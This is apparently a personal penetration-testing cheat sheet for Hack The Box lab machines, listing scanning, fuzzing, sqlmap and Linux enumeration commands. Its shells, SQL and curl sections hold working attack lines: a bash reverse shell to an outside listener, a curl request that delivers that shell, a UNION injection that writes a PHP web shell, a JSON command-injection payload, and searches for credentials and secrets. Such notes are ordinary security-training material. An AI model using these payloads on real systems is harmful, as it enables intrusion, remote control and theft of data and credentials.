# nmap

 - `nmap -sV --open -p- 10.129.5.201`
 - `nmap -sC -sV -p 22,80,8065 10.129.5.201`
 - `nmap --script=vuln -sV -p 22,80,8065 10.129.5.201`
 - `sudo nmap -sV -sU -p- --min-rate 5000 10.129.5.201`
 - `sudo nmap -sU -p 161 -sV 10.129.5.201`

# Update /etc/hosts file

 - `echo "10.129.5.201 academy.htb" | sudo tee -a /etc/hosts`

# ffuf

> After running the following, you want to filter out noise using the -fl option 

 - `ffuf -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://academy.htb/FUZZ`
 - `ffuf -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://academy.htb/FUZZ -e .php,.html,.txt`
 - `ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://academy.htb/ -H "Host: FUZZ.academy.htb"`

# sqlmap

 - `sqlmap -r request --batch`
 - `sqlmap -r request --second-url "http://10.129.95.235/account.php"`
   - We use the second url paramater for when the output is stored in a different url

### Useful options

 - `--dbs` 
   - enumerate the database
 - `-D <db_name> --tables` 
   - enumerate the tables
 - `-D <db_name> -T <table_name> --columns` 
   - enumerate the columns in a table
 - `-D <database_name> --dump-all`
   - dump the entire database

# SQL Stuff

 - `psql -h 127.0.0.1 -U postgres -p`
 - `mysql -u <user> -p`
 - `Brazil' UNION SELECT "<?php SYSTEM $_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -`
   - This is used to drop a web shell when you can do a UNION injection and is a PHP app

# curl

 - `curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=27mmajj85si451dmcbtin048j9" | jq`
 - `curl -sv -X POST http://academy.htb/home.php --cookie "PHPSESSID=1i52bbppla8d5tn8uguvrh3g75" -H 'Content-Type: application/json' --data '{"module_id": "1; id"}'`
 - `curl http://10.129.95.235/test.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.148/4242 0>&1"'`

# Shells

 - `bash -i >& /dev/tcp/10.10.14.148/4242 0>&1`
 - `echo "bash -i >& /dev/tcp/10.10.14.15/4242 0>&1" | base64 -w 0`
 - `Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- -`
   - SQL injection to write a file to create a web shell

# nc

 - `nc -nvlp 4242`

# Stabilizing Shells

 1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 2. `ctrl+z`
 3. `stty raw -echo; fg`
 4. `export TERM=xterm`

# Password Cracking

 - `john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

# snmpwalk

 - `snmpwalk -v1 10.129.155.174:161 -c public`

# grep

 - `grep "*sh$" /etc/passwd`

# Linux Environment Enumeration

 - `whoami`
   - What user are we running as
 - `id`
   - What groups does the user belong to
 - `hostname`
   - What is the server named, can we gather anything from the naming convention
 - `ifconfig`
   - What subnet are we on
 - `sudo -l`
   - Can we run anything with sudo
 - `cat /etc/os-release`
   - Get the OS and release version
 - `echo $PATH`
   - Check to see if the path is misconfigured
 - `env`
   - Check to see if there are any secrets in the environment variables
 - `uname -a`
   - Get the Kernel version to see if there are any exploits we can take advantage of
 - `lscpu`
   - Get CPU type and version
 - `cat /etc/shells`
   - Get the login shells that exist on the server
   - tmux and screen are notable ones you can exploit
 - Check for defenses in place, some notable ones include
   1. Exec Sheild
   2. iptablse
   3. AppArmor
   4. SELinux
   5. Fail2ban
   6. Snort
   7. Uncomplicated Firewall (ufw)
 - `lsblk`
   - Enumerates info about block devices on the system (hard disks, USB drives, etc.)
   - If we discover and can mount an additional drive or unmounted file system they might contain sensitive info
 - `lpstat`
   - Find info about printers attached to the system
 - `cat /etc/fstab`
   - Checks for mounted and unmounted drives
 - `route`
   - See what other networks are available via which interface
 - `cat /etc/resolv.conf`
   - Do this if we re in a domain env - can use this as a starting point to query the AD env
 - `arp -a`
   - Shows the arp table which details what other hosts the target has been communicating with
 - `cat /etc/passwd`
   1. Username
   2. Password
   3. User ID (UID)
   4. Group ID (GID)
   5. User ID info
   6. Home dir
   7. Shell
 - `getent group sudo`
   - List members that are a part of a group that has access to sudo
 - Check `/home`
   - `.bach_history`
   - SSH keys
   - Cred files
 - `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
   - Find .config files
 - `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`
   - Find all config files
 - `find / -readable -exec grep -H root '{}' \; 2>/dev/null | grep password`
